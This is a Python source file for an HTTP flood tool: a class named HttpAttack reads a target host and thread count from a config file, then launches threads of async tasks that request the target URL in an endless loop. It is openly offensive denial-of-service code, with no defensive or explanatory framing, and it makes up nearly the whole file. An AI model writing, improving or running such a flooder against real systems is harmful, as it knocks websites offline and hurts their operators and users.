import asyncio
import aiohttp
import time
from core.debug import Debug
from core.thread import Thread
from core.logger import Logger, requestLogger, requestFailure
from colorama import *
import os
import json


NOTE = Fore.BLUE + "[NOTE] " + Fore.WHITE
INFO = Fore.MAGENTA + "[INFO] " + Fore.WHITE
WARN = Fore.YELLOW + "[WARN] " + Fore.WHITE
ERROR = Fore.RED + "[ERROR] " + Fore.WHITE

__location__ = os.path.realpath(
    os.path.join(os.getcwd(), os.path.dirname(__file__)))

class HttpAttack(Thread):

    def __init__(self):


        self.config_file = os.path.join(__location__, "attack_config.json")

        with open(self.config_file, 'r') as config_file:

            json_data = json.load(config_file)

            self.url = json_data['HOST']
            self.threading_count = json_data['THREADS']
            self.sleep_time = json_data['SLEEP']
            self.threads_num = self.threading_count

    def get_info(self):

        print(WARN + "\n")      
        print(f"url: {self.url}\nthreads: {self.threads_num}\nsleep: {self.sleep_time}")


    def attack(self):
        Logger(__file__)
        
        @self.run_in_thread
        def threaded_attack():
            Logger(__file__)
        
            print("new thread!")

            async def inner():
                Logger(__file__)

                async def begin(sem, url):
                    Logger(__file__)

                    while True:

                        session = get_session()
                        max_attacks = 50

                        for i in range(max_attacks):
                        
                            try:
                                async with sem:
                                    async with session.get(url=self.url) as respones:
                                        print(".", end="", flush=True)
                                        # requestLogger(respones)

                            except Exception as error:
                                requestFailure(error)
                                continue

                        

                # requests = [self.url] * 50

                # b_requests = [begin(self.url) for x in requests]
                            
                sem = asyncio.Semaphore(3)
                tasks = [asyncio.create_task(begin(sem, self.url)) for _ in range(10)]

                await asyncio.gather(*tasks)

            asyncio.run(inner()) 

        def get_session():
            return aiohttp.ClientSession()

        threaded_attack()  

